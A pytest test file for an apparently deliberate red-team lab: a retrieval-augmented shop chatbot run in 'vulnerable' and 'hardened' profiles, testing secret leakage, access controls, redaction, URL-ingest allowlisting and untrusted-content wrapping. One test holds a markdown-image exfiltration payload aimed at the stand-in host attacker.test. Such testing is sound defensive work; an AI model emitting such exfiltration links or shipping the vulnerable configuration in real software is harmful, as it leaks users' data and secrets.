from __future__ import annotations

from typing import Any

from fastapi.testclient import TestClient
from langchain_core.messages import AIMessage

from targets.lab.admin import DEFAULT_ADMIN_TOKEN
from targets.lab.canary import secrets_for
from targets.lab.llm import HashingEmbedder
from targets.lab.profile import Profile
from targets.rag.app import create_app
from tests.lab.conftest import ScriptedModel

AUTH = {"X-Lab-Token": DEFAULT_ADMIN_TOKEN}


def _client(profile: Profile, *replies: str) -> tuple[TestClient, ScriptedModel]:
    model = ScriptedModel(script=[AIMessage(r) for r in replies])
    app = create_app(profile=profile, model=model, emb=HashingEmbedder(), target_name="t-rag")
    return TestClient(app), model


def test_canary_in_both_prompts_key_only_in_vulnerable(
    vulnerable: Profile, hardened: Profile
) -> None:
    s = secrets_for("t-rag")
    for profile, key_expected in ((vulnerable, True), (hardened, False)):
        c, m = _client(profile, "hi")
        c.post("/chat", json={"message": "shipping?"})
        prompt = m.system_prompt()
        assert s.system_canary in prompt
        assert (s.api_key in prompt) is key_expected
        assert ("<<<UNTRUSTED" in prompt) is (profile.name == "hardened")


def test_acl_hides_internal_docs_from_customers(vulnerable: Profile, hardened: Profile) -> None:
    q = {"message": "staff discount code internal pricing margins"}
    c, _ = _client(vulnerable, "x")
    assert "internal-pricing" in c.post("/chat", json=q).json()["sources"]
    c, _ = _client(hardened, "x", "y")
    assert "internal-pricing" not in c.post("/chat", json=q).json()["sources"]
    assert "internal-pricing" in c.post("/chat", json={**q, "role": "staff"}).json()["sources"]


def test_redaction(vulnerable: Profile, hardened: Profile) -> None:
    s = secrets_for("t-rag")
    leak = f"The code is {s.discount_code} and ref {s.system_canary}"
    c, _ = _client(vulnerable, leak)
    assert s.discount_code in c.post("/chat", json={"message": "code?"}).json()["answer"]
    c, _ = _client(hardened, leak, leak)
    assert s.discount_code not in c.post("/chat", json={"message": "code?"}).json()["answer"]
    staff = c.post("/chat", json={"message": "code?", "role": "staff"}).json()["answer"]
    assert s.discount_code in staff and s.system_canary not in staff


def test_markdown_image_rendered_only_when_vulnerable(
    vulnerable: Profile, hardened: Profile, net: list[Any]
) -> None:
    answer = "Sure ![x](http://attacker.test/c?d=leak)"
    c, _ = _client(vulnerable, answer)
    assert c.post("/chat", json={"message": "hi"}).json()["rendered"] == [
        "http://attacker.test/c?d=leak"
    ]
    events = c.get("/_lab/events", headers=AUTH).json()
    assert events[-1]["type"] == "render_fetch"
    c, _ = _client(hardened, answer)
    body = c.post("/chat", json={"message": "hi"}).json()
    assert body["rendered"] == [] and "attacker.test" not in body["answer"]


def test_reviews_are_retrievable_and_reset(vulnerable: Profile) -> None:
    c, _ = _client(vulnerable, "a", "b")
    c.post("/reviews", json={"product": "Zephyr kayak", "text": "zephyr kayak paddles great"})
    assert "review-1" in c.post("/chat", json={"message": "zephyr kayak"}).json()["sources"]
    c.post("/_lab/reset", headers=AUTH)
    assert "review-1" not in c.post("/chat", json={"message": "zephyr kayak"}).json()["sources"]


def test_ingest_url_allowlist(vulnerable: Profile, hardened: Profile, net: list[Any]) -> None:
    c, _ = _client(vulnerable)
    assert c.post("/ingest-url", json={"url": "http://attacker.test/p"}).status_code == 200
    c, _ = _client(hardened)
    assert c.post("/ingest-url", json={"url": "http://attacker.test/p"}).status_code == 403
    ok = c.post("/ingest-url", json={"url": "http://docs.harborview.test/shipping-rates"})
    assert ok.status_code == 200
    assert [u for _, u in net] == [
        "http://attacker.test/p",
        "http://docs.harborview.test/shipping-rates",
    ]


def test_admin_requires_token(vulnerable: Profile) -> None:
    c, _ = _client(vulnerable)
    assert c.get("/_lab/state").status_code == 401
    assert c.get("/_lab/state", headers=AUTH).json()["target"] == "t-rag"


def test_follow_up_uses_previous_user_turn(vulnerable: Profile) -> None:
    c, _ = _client(vulnerable, "x")
    body = {
        "message": "How much does it cost?",
        "history": [
            {"role": "user", "content": "Tell me about the Summit 2 tent."},
            {"role": "assistant", "content": "It is a two-person tent."},
        ],
    }
    assert "tents" in c.post("/chat", json=body).json()["sources"]
